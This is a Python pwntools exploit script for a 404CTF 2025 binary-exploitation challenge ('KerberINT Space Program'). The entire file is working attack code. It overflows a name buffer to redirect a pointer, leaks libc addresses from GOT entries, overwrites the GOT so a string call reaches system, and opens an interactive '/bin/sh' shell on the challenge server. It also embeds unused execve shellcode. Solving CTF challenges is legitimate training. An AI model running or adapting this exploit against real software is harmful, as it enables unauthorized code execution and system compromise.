from pwn import *

exe = ELF(b'./chall')
libc = ELF(b'./libc.so.6')
main = exe.symbols['main']
init_rocket = exe.symbols['initialize_rocket']


context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path], env={"LD_PRELOAD": "/home/john/Desktop/CTFs/2025/404CTF/Exploitation de Binaires/KerberINT Space Program/kerberint-space-program/libc.so.6"})
        return r
    else:
        return remote('challenges.404ctf.fr', 31338)


def generate_shellcode():
    shellcode_asm = """
        xor     rdx, rdx
        movabs  rbx, 0x68732f6e69622fff
        shr     rbx, 8
        push    rbx
        mov     rdi, rsp
        xor     rax, rax
        push    rax
        push    rdi
        mov     rsi, rsp
        mov     al, 0x3b
        syscall 
        push    1
        pop     rdi
        push    0x3c
        pop     rax
        syscall 
	"""
    shellcode = asm(shellcode_asm, bits=64)
    return shellcode



def create_rocket(r: process):
    r.recvuntil(b">")
    r.send_raw(b'1\n')
    r.recvuntil(b">>")
    r.send_raw(b'1234\n')
    r.recvuntil(b">>")
    r.send_raw(b"mytenoname\n")
    r.recvuntil(b">>")
    r.send_raw(b"yo\n")

def edit_name(r: process, name: bytes):
    r.recvuntil(b">")
    r.send_raw(b'3\n')
    r.recvuntil(b"Choose its name")
    r.send_raw(name + b'\n')

def edit_description(r: process, name: bytes):
    r.recvuntil(b">")
    r.send_raw(b'4\n')
    r.recvuntil(b"Choose its description")
    r.send_raw(name + b'\n')

def display(r: process) -> list[bytes]:
    r.recvuntil(b"Enter your choice")
    r.send_raw(b'5\n')
    receive = r.recvuntil(b"-----------------|KSP|-----------------").split(b"\n")
    return receive


def leak_strlen_got(r):
    edit_name(r, b"mytenoname12")
    edit_name(r, b"mytenoname123")
    edit_name(r, b"mytenoname1234")
    edit_name(r, b"mytenoname12345")
    edit_name(r, b"mytenoname123456")
    edit_name(r, b"mytenoname123456\x36")
    edit_name(r, b"mytenoname123456\x36\x14")
    edit_name(r, b"mytenoname123456\x10\x50\x40")

    receive = display(r)
    desc_field = receive[-2]
    leaked_addr = desc_field.split(b" ")[-1]
    clean_leaked = leaked_addr[::-1]
    strlen_addr = hex(int.from_bytes(clean_leaked))

    return strlen_addr

def leak_puts_got(r):
    edit_name(r, b"mytenoname123456\x08\x50\x40\x00")

    receive = display(r)
    desc_field = receive[-2]
    leaked_addr = desc_field.split(b" ")[-1]
    clean_leaked = leaked_addr[::-1]
    strlen_addr = hex(int.from_bytes(clean_leaked))

    return strlen_addr

def leak_print_got(r):
    edit_name(r, b"mytenoname123456\x18\x50\x40\x00")

    receive = display(r)
    desc_field = receive[-2]
    leaked_addr = desc_field.split(b" ")[-1]
    clean_leaked = leaked_addr[::-1]
    strlen_addr = hex(int.from_bytes(clean_leaked))

    return strlen_addr

def leak_getchar_got(r):
    edit_name(r, b"mytenoname123456\x20\x50\x40\x00")

    receive = display(r)
    desc_field = receive[-2]
    leaked_addr = desc_field.split(b" ")[-1]
    clean_leaked = leaked_addr[::-1]
    strlen_addr = hex(int.from_bytes(clean_leaked))

    return strlen_addr

def leak_malloc_got(r):
    edit_name(r, b"mytenoname123456\x28\x50\x40\x00")

    receive = display(r)
    desc_field = receive[-2]
    leaked_addr = desc_field.split(b" ")[-1]
    clean_leaked = leaked_addr[::-1]
    strlen_addr = hex(int.from_bytes(clean_leaked))

    return strlen_addr

def leak_setvbuf_got(r):
    edit_name(r, b"mytenoname123456\x30\x50\x40\x00")

    receive = display(r)
    desc_field = receive[-2]
    leaked_addr = desc_field.split(b" ")[-1]
    clean_leaked = leaked_addr[::-1]
    strlen_addr = hex(int.from_bytes(clean_leaked))

    return strlen_addr

def leak_scanf_got(r):
    edit_name(r, b"mytenoname123456\x38\x50\x40\x00")

    receive = display(r)
    desc_field = receive[-2]
    leaked_addr = desc_field.split(b" ")[-1]
    clean_leaked = leaked_addr[::-1]
    strlen_addr = hex(int.from_bytes(clean_leaked))

    return strlen_addr

def leak_exit_got(r):
    edit_name(r, b"mytenoname123456\x40\x50\x40\x00")

    receive = display(r)
    desc_field = receive[-2]
    leaked_addr = desc_field.split(b" ")[-1]
    clean_leaked = leaked_addr[::-1]
    strlen_addr = hex(int.from_bytes(clean_leaked))

    return strlen_addr



    

def main():
    global r 
    offset_system = libc.symbols['system'] - 0xc17c0
    offset_puts = libc.symbols['puts'] - 0xc17c0
    offset_strlen = libc.symbols['strlen']

    r = conn()
    pause()

    create_rocket(r)

    leaked_strlen = int(leak_strlen_got(r), 16)
    leaked_puts = int(leak_puts_got(r), 16).to_bytes(8, byteorder='little')
    leaked_print = int(leak_print_got(r), 16).to_bytes(8, byteorder='little')
    leaked_getchar = int(leak_getchar_got(r), 16).to_bytes(8, byteorder='little')
    leaked_malloc = int(leak_malloc_got(r), 16).to_bytes(8, byteorder='little')
    leaked_setvbuf = int(leak_setvbuf_got(r), 16).to_bytes(8, byteorder='little')
    leaked_scanf = int(leak_scanf_got(r), 16).to_bytes(8, byteorder='little')
    leaked_exit = int(leak_exit_got(r), 16).to_bytes(8, byteorder='little')

    print("LEAKED strlen", hex(leaked_strlen))
    libc_base = leaked_strlen - offset_strlen
    print("LIBC base", hex(libc_base))
    system = int(libc_base + offset_puts).to_bytes(8, byteorder="little")
    print("LIBC system", system)
    leaked_strlen = leaked_strlen.to_bytes(8, byteorder="little")

    edit_name(r, b"AAAAAAAAAAAAAAAA\x00\x50\x40\x00")
    edit_description(r, 
        system +
        leaked_puts +
        leaked_strlen +
        leaked_print +
        leaked_getchar +
        leaked_malloc +
        leaked_setvbuf +
        leaked_scanf +
        leaked_exit
    )
    edit_name(r, b"BBBBBBBBBBBBBBBB")
    edit_name(r, b"BBBBBBBBBBBBBBBB\x50")
    edit_name(r, b"BBBBBBBBBBBBBBBB\x50\x50")
    edit_name(r, b"BBBBBBBBBBBBBBBB\x50\x50\x40\x00")
    edit_description(r, b'/bin/sh\x00')

    r.interactive()

if __name__ == '__main__':
    main()

